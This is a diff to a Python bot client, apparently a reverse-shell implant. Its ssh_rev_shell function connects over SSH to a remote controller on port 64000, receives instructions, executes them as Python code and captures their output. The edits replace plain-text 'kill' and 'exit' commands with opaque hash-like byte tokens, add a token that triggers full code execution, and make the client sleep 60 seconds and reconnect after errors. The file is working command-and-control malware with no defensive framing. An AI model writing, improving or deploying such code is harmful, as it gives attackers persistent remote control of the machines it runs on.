@@ -145,16 +145,18 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             while not timeout:
                 try:
                     ssh_session.settimeout(1.0)
-                    server_instructions = ssh_session.recv(1024).decode().strip()
+                    server_instructions = ssh_session.recv(4096)
+                    #server_instructions = ssh_session.recv(4096).decode().strip()
                     #server_instructions = server_instructions.encode()
                     server_instructions = server_instructions
+
 
                     if server_instructions:
 
                         # Handle termination command
-                        if server_instructions == 'kill':
-                            exit_gracefully()
-                        if server_instructions == 'exit':
+                        #if server_instructions == b"1e48997bf6757e032ca7b6984fb7fa3add3528d278c848ead982a9a854fe1fa8":
+                        #    exit_gracefully()
+                        if server_instructions == b'3a01c2da6e340278db1fd04b6edeceae4736f077aba794179941c077a95f0d73':
                             ssh_session.close()
                             ssh_client.close()
                             return
@@ -164,8 +166,8 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
 
                         # This requests a complete execution
-                        if server_instructions.startswith('fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e'):
-                            server_instructions = server_instructions.removeprefix('fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e')
+                        if server_instructions.startswith(b'fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e'):
+                            server_instructions = server_instructions.removeprefix(b'fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e')
                             try:
                                 output = io.StringIO()
                                 sys.stdout = output  # Redirect stdout to capture print statements
@@ -184,6 +186,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
                         else:
                             #server_instructions = server_instructions.removeprefix('eval')
+                            server_instructions = server_instructions.decode()
                             try:
                                 output = io.StringIO()
                                 sys.stdout = output  # Redirect stdout to capture print statements
@@ -231,6 +234,7 @@ if __name__ == "__main__":
         try:
             ssh_rev_shell(host, 'ubuntu', auth_path, user, 64000)
         except Exception as e:
+            time.sleep(60)
             pass
 
         # How frequent request a command
